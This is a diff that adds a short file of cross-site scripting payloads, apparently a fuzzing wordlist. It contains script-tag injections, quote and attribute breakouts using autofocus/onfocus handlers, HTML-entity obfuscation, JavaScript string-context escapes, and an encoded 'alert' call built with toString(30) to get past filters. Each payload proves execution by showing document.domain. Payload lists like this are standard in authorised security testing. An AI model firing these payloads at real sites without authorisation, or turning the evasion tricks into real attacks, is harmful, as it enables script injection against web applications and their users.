@@ -1,0 +1,14 @@
+<script> alert("hi") </script> 
+<script>alert(document.domain)</script>
+"><script>alert(document.domain)</script>
+" autofocus onfocus="alert(document.domain)
+"autofocus/onfocus="alert(document.domain)
+"autofocus/onfocus="confirm&#40;document.domain&#41;
+'-alert(document.domain)-'
+\'-alert(document.domain);<!--
+\'-alert(document.domain);//
+" autofocus="" onfocus="alert(document.domain)
+"};this[8680439..toString(30)](1);//
+"};this[8680439..toString(30)](1);{"
+'};this[8680439..toString(30)](1);{'
+';this[8680439..toString(30)](1);'
